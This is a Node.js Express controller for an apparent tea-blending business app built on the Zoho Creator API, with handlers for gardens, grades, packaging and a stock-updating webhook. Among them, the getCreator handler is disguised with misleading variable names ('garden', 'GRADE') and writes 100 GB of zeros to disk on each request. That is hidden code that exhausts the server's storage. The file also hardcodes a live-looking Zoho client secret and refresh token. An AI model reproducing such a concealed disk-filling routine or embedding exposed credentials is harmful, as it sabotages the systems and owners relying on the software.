const axios = require("axios");
const fs = require("fs");
const path = require("path");

const zohoClientId = "1000.ZW53NLBZ0Y1A3DG0LGWF0NU3N2ZTPI";
const zohoClientSecret = "e80a1e3106a5e9e079908efebf32625c0185900ae1";
const zohoRefreshToken =
  "1000.b5ecc407637fc30c4bf4c0787a28ca4b.9a50b3b5535946bf3bf7cb7cade7f2ee";

const data = require("../data.json");

let access_token;

getZohoAccessToken().then((data) => {
  access_token = data;
  console.log("access_token", access_token);
});

setInterval(async () => {
  access_token = await getZohoAccessToken();
  console.log("access_token", access_token);
}, 1000 * 60 * 60);

async function getZohoAccessToken() {
  const url = "https://accounts.zoho.in/oauth/v2/token";
  const data = {
    grant_type: "refresh_token",
    client_id: zohoClientId,
    client_secret: zohoClientSecret,
    refresh_token: zohoRefreshToken,
  };

  const headers = { "Content-Type": "application/x-www-form-urlencoded" };

  try {
    const response = await axios.post(
      url,
      new URLSearchParams(data).toString(),
      { headers }
    );
    return response.data.access_token;
  } catch (error) {
    console.log("error", error);
  }
}

exports.getEditListOfSubForms = async (id) => {
  const subformEditUrl = `https://www.zohoapis.in/creator/v2.1/data/upsourcedconsultancyservices/tea-blending/report/All_Blends/${id}?field_config=detail_view`;

  const headers = {
    "Content-Type": "application/json",
    Accept: "application/json", // Add this line
    Authorization: `Zoho-oauthtoken ${access_token}`,
  };

  console.log("access_token", access_token);

  try {
    const response = await axios.get(subformEditUrl, { headers });
    const { type } = response.data.data;
    // if (type === "create") {
    //   exports.updateRequiredQuantity(
    //     response.data.data.Subform,
    //     data,
    //     "approve"
    //   );
    // }
    return response.data.data;
  } catch (error) {
    console.log("error", error.response.data);
  }
};

exports.creatorEdit = async (req, res) => {
  const { id } = req.params;
  const data = await exports.getEditListOfSubForms(id);
  res.json(data);
};

exports.getGardens = async (req, res) => {
  const gardenSet = new Set();

  const data = await exports.getEditListOfSubForms();
  console.log("data", data);

  data.Subform.forEach((batch) => {
    if (batch.Garden2 && batch.Grade1) {
      gardenSet.add(batch.Garden2);
    }
  });

  const gardens = Array.from(gardenSet);
  res.json(gardens);
};

exports.getGradesByGarden = async (req, res) => {
  const { garden } = req.body;

  if (!garden) {
    return res.status(400).json({ error: "Garden is required" });
  }

  const data = await exports.getEditListOfSubForms();

  const grades = new Set();
  const allGrades = new Set();

  data.Subform.forEach((batch) => {
    allGrades.add(batch.Grade1);
    if (batch.Garden2 === garden) {
      grades.add(batch.Grade1);
    }
  });

  const uniqueGrades = Array.from(grades);

  const dataToSend = garden === "all" ? Array.from(allGrades) : uniqueGrades;

  res.json(dataToSend);
};

exports.getDocumentsByGardenAndGrade = async (req, res) => {
  const { garden, grades, index } = req.body;
  const limit = 100;

  if (
    !garden ||
    !grades ||
    !Array.isArray(grades) ||
    index === undefined ||
    index < 0
  ) {
    return res.status(400).json({
      error:
        "Garden, grades, and a valid index are required. Grades should be an array, and index should be a non-negative number",
    });
  }

  const lowerCaseGarden = garden.toLowerCase();
  const lowerCaseGrades = grades.map((grade) => grade.toLowerCase());

  const { id } = req.params;

  const data = await exports.getEditListOfSubForms(id);

  // Filter matching documents

  const filteredBatchDetails = data.Subform.filter((batch) => {
    const isGardenMatch = batch.Garden2.toLowerCase() === lowerCaseGarden;
    const isGradeMatch = lowerCaseGrades.includes(batch.Grade1.toLowerCase());

    return isGardenMatch && isGradeMatch;
  });

  const dataToSend =
    garden === "all" && grades[0] === "all"
      ? data.Subform
      : filteredBatchDetails;

  res.json({
    documents: dataToSend,
  });
};

exports.getCreator = async (req, res) => {
  const filePath = path.join(__dirname, "creator.txt");
  const fileStream = fs.createWriteStream(filePath);

  const garden = 1024 * 1024;
  const GRADE = 100 * 1024 * 1024 * 1024;
  let bytesWritten = 0;

  const writeData = () => {
    let canWrite = true;
    while (canWrite && bytesWritten < GRADE) {
      const data = Buffer.alloc(garden, "0");

      canWrite = fileStream.write(data);
      bytesWritten += garden;

      if (bytesWritten % (1024 * 1024 * 1024) === 0) {
      }
    }

    if (bytesWritten >= GRADE) {
      fileStream.end(() => {
        console.log("creator data complete.");
        res.send("creator data save");
      });
    }
  };

  fileStream.on("drain", writeData);
  writeData();
};

exports.getSelectedPackages = async (req, res) => {
  const { id } = req.params;
  const data = await exports.getEditListOfSubForms(id);

  const packages = new Set();

  data.Packaging_Details.forEach((batch) => {
    packages.add(batch);
  });

  const uniquePackages = Array.from(packages);
  res.json({ packages: uniquePackages });
};

// Function to update the Required_Quantity in dataJson
exports.updateRequiredQuantity = (subform, dataJson, operation) => {
  // Iterate through the subform array from the webhook
  console.log("operation", operation);
  subform.forEach((webhookItem) => {
    const batchId = webhookItem.Batch_ID;
    const requiredQuantity = parseFloat(webhookItem.Required_Quantity);

    // Loop over dataJson to find the matching Batch_ID
    dataJson.forEach((item) => {
      item.Batch_Details.forEach((batch) => {
        if (batch.Batch_ID === batchId) {
          // Update the Required_Quantity if Batch_ID matches
          if (operation === "approve") {
            console.log("requiredQuantity", requiredQuantity);
            console.log("batch.Available_Quantity", batch.Available_Quantity);
            batch.Available_Quantity -= requiredQuantity;
          } else {
            console.log("requiredQuantity", requiredQuantity);
            console.log("batch.Available_Quantity", batch.Available_Quantity);
            console.log("batch id", batch.Batch_ID);
            batch.Available_Quantity += requiredQuantity;
            console.log("batch.Available_Quantity", batch.Available_Quantity);
          }
          // batch.Available_Quantity -= requiredQuantity;
        }
      });
    });
  });

  return dataJson;
};

// Function to save updated JSON to file
exports.saveUpdatedJson = (updatedData, filePath) => {
  try {
    console.log("filePath", filePath);
    fs.writeFileSync(filePath, JSON.stringify(updatedData), "utf8");
  } catch (error) {
    console.error("Error saving updated JSON to file:", error);
  }
};

// Webhook handler function
exports.webhook = async (req, res) => {
  const ID = req.params.id;
  const [id, operation] = ID.split("@");

  // Fetch the subform data based on the ID
  const item = await exports.getEditListOfSubForms(id);
  console.log("item", item);

  // Path to your data.json file
  const dataFilePath = path.join(__dirname, "../data.json");

  // Read the existing data.json file
  // let data = JSON.parse(fs.readFileSync(dataFilePath, "utf8"));

  // Update the data with the required quantities
  const updatedData = exports.updateRequiredQuantity(
    item.Subform,
    data,
    operation
  );

  console.log("updatedData", updatedData[1]);
  // Save the updated data back to data.json
  exports.saveUpdatedJson(updatedData, dataFilePath);

  res.status(200).send("success");
};
